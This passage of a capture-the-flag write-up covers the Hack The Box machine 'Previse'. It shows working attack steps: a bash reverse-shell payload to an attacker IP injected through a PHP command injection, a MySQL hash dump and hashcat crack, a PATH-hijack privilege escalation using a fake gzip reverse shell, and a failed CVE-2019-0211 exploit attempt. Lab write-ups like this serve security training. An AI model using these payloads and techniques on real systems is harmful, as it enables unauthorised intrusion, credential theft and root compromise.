</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">$ cat config<span style="color:#ff79c6">.</span>php
<span style="color:#ff79c6">&lt;?</span>php
<span style="color:#ff79c6">function</span> <span style="color:#50fa7b">connectDB</span>(){
    <span style="color:#8be9fd;font-style:italic">$host</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;localhost&#39;</span>;
    <span style="color:#8be9fd;font-style:italic">$user</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;root&#39;</span>;
    <span style="color:#8be9fd;font-style:italic">$passwd</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;mySQL_p@ssw0rd!:)&#39;</span>;
    <span style="color:#8be9fd;font-style:italic">$db</span> <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;previse&#39;</span>;
    <span style="color:#8be9fd;font-style:italic">$mycon</span> <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> mysqli(<span style="color:#8be9fd;font-style:italic">$host</span>, <span style="color:#8be9fd;font-style:italic">$user</span>, <span style="color:#8be9fd;font-style:italic">$passwd</span>, <span style="color:#8be9fd;font-style:italic">$db</span>);
    <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">$mycon</span>;
}
<span style="color:#ff79c6">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>Indeed we cannot remotely login:</p>
<pre><code>sudo apt install mycli
dpkg-query -L mycli | grep &quot;bin/mycli&quot;
/usr/bin/mycli
mycli -h 10.10.11.104 -p 8080 -D previse -u root --pass &quot;mySQL_p@ssw0rd\!\:\)&quot;
(2003, &quot;Can't connect to MySQL server on '10.10.11.104' ([Errno 111] Connection refused)&quot;)
</code></pre>
<h2 id="os-command-injection">OS command injection</h2>
<p>row 20 there is an obvious OS command Injection vulnerability:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">cat logs<span style="color:#ff79c6">.</span>php
<span style="color:#ff79c6">&lt;?</span>php
session_start();
<span style="color:#ff79c6">if</span> (<span style="color:#ff79c6">!</span>isset(<span style="color:#8be9fd;font-style:italic">$_SESSION</span>[<span style="color:#f1fa8c">&#39;user&#39;</span>])) {
    header(<span style="color:#f1fa8c">&#39;Location: login.php&#39;</span>);
    <span style="color:#ff79c6">exit</span>;
}
<span style="color:#ff79c6">?&gt;</span>

&lt;?php
if (!$_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;POST&#39;) {
    header(&#39;Location: login.php&#39;);
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec(&#34;/usr/bin/python /opt/scripts/log_process.py {$_POST[&#39;delim&#39;]}&#34;);
echo $output;

$filepath = &#34;/var/www/out.log&#34;;
$filename = &#34;out.log&#34;;

if(file_exists($filepath)) {
    header(&#39;Content-Description: File Transfer&#39;);
    header(&#39;Content-Type: application/octet-stream&#39;);
    header(&#39;Content-Disposition: attachment; filename=&#34;&#39;.basename($filepath).&#39;&#34;&#39;);
    header(&#39;Expires: 0&#39;);
    header(&#39;Cache-Control: must-revalidate&#39;);
    header(&#39;Pragma: public&#39;);
    header(&#39;Content-Length: &#39; . filesize($filepath));
    ob_clean(); // Discard data in the output buffer
    flush(); // Flush system headers
    readfile($filepath);
    die();
} else {
    http_response_code(404);
    die();
}
?&gt;
</code></pre></td></tr></table>
</div>
</div><p>On BURP, I url encode this payload:</p>
<table>
<thead>
<tr>
<th>encoding</th>
<th>payload</th>
</tr>
</thead>
<tbody>
<tr>
<td>plain</td>
<td>delim=comma; bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/10.10.14.51/80 0&gt;&amp;1&rsquo;</td>
</tr>
<tr>
<td>urlencoded</td>
<td>delim=comma%3b+bash+-c+&lsquo;bash+-i+&gt;%26+/dev/tcp/10.10.14.51/80+0&gt;%261&rsquo;</td>
</tr>
</tbody>
</table>
<p>A shell comes back:</p>
<pre><code>www-data@previse:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@previse:/var/www/html$ ls -la /home
drwxr-xr-x 5 m4lwhere m4lwhere 4096 Jul 28 09:10 m4lwhere
www-data@previse:/var/www/html$ ls -la /home/m4lwhere
lrwxrwxrwx 1 root root 9 Jun 6 13:04 .bash_history -&gt; /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere 220 Apr 4 2018 .bash_logout
-rw-r--r-- 1 m4lwhere m4lwhere 3771 Apr 4 2018 .bashrc
drwx------ 2 m4lwhere m4lwhere 4096 May 25 15:25 .cache
drwxr-x--- 3 m4lwhere m4lwhere 4096 Jun 12 10:09 .config
drwx------ 4 m4lwhere m4lwhere 4096 Jun 12 10:10 .gnupg
-rw-r--r-- 1 m4lwhere m4lwhere 807 Apr 4 2018 .profile
-rw-r--r-- 1 m4lwhere m4lwhere 75 May 31 19:19 .selected_editor
lrwxrwxrwx 1 root root 9 Jul 28 09:10 .viminfo -&gt; /dev/null
-rw-r--r-- 1 m4lwhere m4lwhere 75 Jun 18 01:18 .vimrc
-r-------- 1 m4lwhere m4lwhere 33 Oct 17 07:08 user.txt
</code></pre>
<h2 id="mysql">Mysql</h2>
<h3 id="obtain-the-mysql-cli">Obtain the mysql cli</h3>
<p>While we were not able to login mysql remotely, there is a chance for us to be more successful locally</p>
<pre><code>www-data@previse:/dev/shm$ ss -lntp
ss -lntp
State    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port
LISTEN   0         80                127.0.0.1:3306             0.0.0.0:*
LISTEN   0         5                   0.0.0.0:8080             0.0.0.0:*        users:((&quot;lcx&quot;,pid=1956,fd=3))
LISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*
LISTEN   0         128                 0.0.0.0:22               0.0.0.0:*
LISTEN   0         128                       *:80                     *:*
LISTEN   0         128                    [::]:22                  [::]:*
</code></pre>
<p>we can connect on localhost:3306:</p>
<pre><code>www-data@previse:/dev/shm$ mysql -h localhost -P 3306 -D previse -u root -p
Enter password: mySQL_p@ssw0rd!:)
</code></pre>
<p>It fails, maybe we have to upgrade the shell:</p>
<pre><code>www-data@previse:/var/www/html$ /usr/bin/python3.6 -c &quot;import pty;pty.spawn('/bin/bash')&quot;
CTRL_Z
echo $TERM
screen
stty -a
speed 38400 baud; rows 46; columns 158; line = 0;
stty raw -echo
fg
reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@previse:/var/www/html$ export SHELL=bash
www-data@previse:/var/www/html$ export TERM=screen
www-data@previse:/var/www/html$ stty rows 46 columns 158
</code></pre>
<p>We are successful to get the cli works:</p>
<pre><code>mysql -h localhost -P 3306 -D previse -u root -p
Enter password: mySQL_p@ssw0rd!:)
[..]
mysql&gt;
</code></pre>
<h3 id="explore-the-database">Explore the database</h3>
<p>We obtain the m4lwhere user password hash that we can crack with john or hashcat:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">show</span> tables;

<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Tables_in_previse <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> accounts          <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span> files             <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">-------------------+
</span><span style="color:#6272a4"></span>
mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">describe</span> accounts;

<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> Field      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Type</span>         <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Null</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Key</span> <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">Default</span>           <span style="color:#ff79c6">|</span> Extra          <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id         <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">int</span>(<span style="color:#bd93f9">11</span>)      <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> PRI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span> auto_increment <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span> username   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">50</span>)  <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span> UNI <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span> password   <span style="color:#ff79c6">|</span> <span style="color:#8be9fd;font-style:italic">varchar</span>(<span style="color:#bd93f9">255</span>) <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NO</span>   <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">NULL</span>              <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">|</span> created_at <span style="color:#ff79c6">|</span> datetime     <span style="color:#ff79c6">|</span> YES  <span style="color:#ff79c6">|</span>     <span style="color:#ff79c6">|</span> <span style="color:#ff79c6">CURRENT_TIMESTAMP</span> <span style="color:#ff79c6">|</span>                <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">------------+--------------+------+-----+-------------------+----------------+
</span><span style="color:#6272a4"></span>
mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, password <span style="color:#ff79c6">from</span> accounts;

<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username     <span style="color:#ff79c6">|</span> password                           <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere     <span style="color:#ff79c6">|</span> $<span style="color:#bd93f9">1</span>$_llol$DQpmdvnb7EeuO6UaqRItf. <span style="color:#ff79c6">|</span>
[..]
<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+--------------+------------------------------------+
</span></code></pre></td></tr></table>
</div>
</div><h2 id="shell-as-m4lwhere">Shell as m4lwhere</h2>
<p>hashid failed to identify the salted hash:</p>
<pre><code>sudo apt install hashcat hashid
hashid -m '$1$_llol$DQpmdvnb7EeuO6UaqRItf.'
Analyzing '$1$_llol$DQpmdvnb7EeuO6UaqRItf.'
[+] Unknown hash
</code></pre>
<p>HashTag.py tells us it is hashcat mode 500 (md5):</p>
<pre><code>git clone https://github.com/SmeegeSec/HashTag.git
python2 HashTag.py -sh '$1$_llol$DQpmdvnb7EeuO6UaqRItf.'
Hash: $1$_llol$DQpmdvnb7EeuO6UaqRItf.
[*] md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5 - Hashcat Mode 500
</code></pre>
<p>Crack:</p>
<pre><code>hashcat -m 500 -a 3 '$1$_llol$DQpmdvnb7EeuO6UaqRItf.' /opt/dictionaries/rockyou.txt --force
</code></pre>
<ul>
<li><code>-m 500</code> is for md5</li>
<li><code>-a 0</code> is for Wordlist attack</li>
<li><code>--force</code> because we don&rsquo;t have a GPU</li>
</ul>
<p>At this stage it is a failure, and this is when I start to doubt about the password encoding or copy from my terminal. I give another try using <code>to_base64(password)</code> instead and we are successful to break the hash. Lesson is learnt.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">mysql<span style="color:#ff79c6">&gt;</span> <span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
<span style="color:#ff79c6">select</span> id, username, TO_BASE64(password) <span style="color:#ff79c6">from</span> accounts;
<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span> id <span style="color:#ff79c6">|</span> username <span style="color:#ff79c6">|</span> TO_BASE64(password)                              <span style="color:#ff79c6">|</span>
<span style="color:#ff79c6">+</span><span style="color:#6272a4">----+----------+--------------------------------------------------+
</span><span style="color:#6272a4"></span><span style="color:#ff79c6">|</span>  <span style="color:#bd93f9">1</span> <span style="color:#ff79c6">|</span> m4lwhere <span style="color:#ff79c6">|</span> JDEk8J<span style="color:#ff79c6">+</span>ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg<span style="color:#ff79c6">==</span> <span style="color:#ff79c6">|</span>
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Lesson Learnt: beware what you copy from or to the terminal. Use Base64 when unsure !</p>
</blockquote>
<pre><code>echo JDEk8J+ngmxsb2wkRFFwbWR2bmI3RWV1TzZVYXFSSXRmLg==  | base64 -d &gt; hashes.txt
hashcat hashes.txt /opt/dictionaries/rockyou.txt -m 500 --force
$1$_llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
</code></pre>
<p>Comparing the hex version of the copy-pasted passwords with the base64 extracted version reveals differences invisible to the eye:</p>
<pre><code>xxd -c 35 hashes.txt
00000000: 2431 24f0 9fa7 826c 6c6f 6c24 4451 706d 6476 6e62 3745 6575 4f36 5561 7152 4974 662e 0a  $1$....llol$DQpmdvnb7EeuO6UaqRItf..
00000023: 2431 245f 6c6c 6f6c 2444 5170 6d64 766e 6237 4565 754f 3655 6171 5249 7466 2e0a          $1$_llol$DQpmdvnb7EeuO6UaqRItf..
</code></pre>
<p>We can now ssh and retrieve the flag</p>
<pre><code>ssh m4lwhere@10.10.11.104
m4lwhere@previse:~$ id
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
m4lwhere@previse:~$ cat user.txt
5a405a9e7a9bbf7c9f0c583c3945f805
</code></pre>
<h2 id="privesc">PrivESC</h2>
<p>sshpass -p ilovecody112235! ssh <a href="mailto:m4lwhere@10.10.11.104">m4lwhere@10.10.11.104</a>
m4lwhere@previse:~$ sudo -l
User m4lwhere may run the following commands on previse:
(root) /opt/scripts/access_backup.sh</p>
<p>access_backup.sh:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#ff79c6">#!/bin/bash
</span><span style="color:#ff79c6"></span>
<span style="color:#6272a4"># We always make sure to store logs, we take security SERIOUSLY here</span>

<span style="color:#6272a4"># I know I shouldnt run this as root but I cant figure it out programmatically on my account</span>
<span style="color:#6272a4"># This is configured to run with cron, added to sudo so I can run as needed - we&#39;ll fix it later when there&#39;s time</span>

gzip -c /var/log/apache2/access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_access.gz
gzip -c /var/www/file_access.log &gt; /var/backups/<span style="color:#ff79c6">$(</span>date --date<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;yesterday&#34;</span> +%Y%b%d<span style="color:#ff79c6">)</span>_file_access.gz
</code></pre></td></tr></table>
</div>
</div><p>inspect permissions:</p>
<pre><code>m4lwhere@previse:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
m4lwhere@previse:~$ whereis date
date: /bin/date /usr/share/man/man1/date.1.gz
</code></pre>
<p>We should be able to execute bash instead of gzip or date by abusing a path injection:</p>
<pre tabindex="0"><code>m4lwhere@previse:~$ vim ./gzip
m4lwhere@previse:~$ cat ./gzip
#!/bin/bash
bash -i &gt;&amp; /dev/tcp/10.10.14.51/80 0&gt;&amp;
m4lwhere@previse:~$ chmod a+x ./gzip
m4lwhere@previse:~$ sudo /opt/scripts/access_backup.sh
───────────────────────────────────────────────────────────────────────────────
rlwrap nc -lnvp 80
Listening on 0.0.0.0 80
Connection received on 172.19.0.1 59608
root@previse:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@previse:~# cat /root/root.txt
cat /root/root.txt
a66e3f03f7a2c86f15d757c3f5cde734
root@previse:~#
</code></pre><h2 id="failed-carpediem-local-privesc-on-apache">Failed carpediem: local PrivESC on Apache</h2>
<pre><code>$ searchsploit apache 2.4.29
-------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                        |  Path
-------------------------------------------------------------------------------------- ---------------------------------
Apache 2.4.17 &lt; 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation | linux/local/46676.php
</code></pre>
<p>We modify the exploit to set suid on /usr/bin/python3.6 for this Local Privilege Escalation</p>
<pre><code>$ searchsploit -m 46676
[..]
$ nvim 46676.php
</code></pre>
<p>Upload the exploit:</p>
<pre><code>www-data@previse:/var/www/html$ cd /dev/shm
www-data@previse:/dev/shm$ wget http://10.10.14.51:9000/46676.php
www-data@previse:/dev/shm$ cp 46676.php /var/www/html/carpediem.php
──────────────────────────────────────────────────────────────────────────────
$ ls
46676.php
$ python3 -m http.server 9000
Serving HTTP on 0.0.0.0 port 9000 (http://0.0.0.0:9000/) ...
172.19.0.1 - - [17/Oct/2021 17:36:14] &quot;GET /46676.php HTTP/1.1&quot; 200 -
</code></pre>
<p>Failed Exploitation, we were not successful in obtaining suid sticky bits:</p>
<pre><code>www-data@previse:/dev/shm$ curl http://localhost/carpediem.php
www-data@previse:/dev/shm$ sudo /usr/sbin/logrotate /etc/logrotate.conf --force
www-data@previse:/dev/shm$ ls -alh /usr/bin/python3.6
-rwxr-xr-x 2 root root 4.4M Jan 26  2021 /usr/bin/python3.6
</code></pre>
<p>Our Apache version is vulnerable but the exploit does not work:</p>
<pre><code>m4lwhere@previse:~$ uname -a
Linux previse 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
m4lwhere@previse:~$ apache2 -v
Server version: Apache/2.4.29 (Ubuntu)
Server built:   2021-06-18T11:06:22
</code></pre>
<p>running with php directly does not work, we have to use curl</p>
<pre><code>m4lwhere@previse:~$ php /var/www/html/carpediem.php
CARPE (DIEM) ~ CVE-2019-0211

The following addresses were not determined by parsing /proc/self/maps: shm, libaprR, libaprX, apache, zend_object_std_dtor
</code></pre>
<p>Running the script locally shows the PHP UAF Trigger fails:</p>
<pre><code>m4lwhere@previse:/var/www/html$ curl -s http://localhost/cfreal-carpediem.php
CARPE (DIEM) ~ CVE-2019-0211

PID: 4625
Fetching addresses
  zend_object_std_dtor: 0x7f174383abc0
  system: 0x7f1746747550
  libaprX: 0x7f1746d08000-0x0x7f1746d3b000
  libaprR: 0x7f1746f3b000-0x0x7f1746f3c000
  shm: 0x7f17474b5000-0x0x7f17474c9000
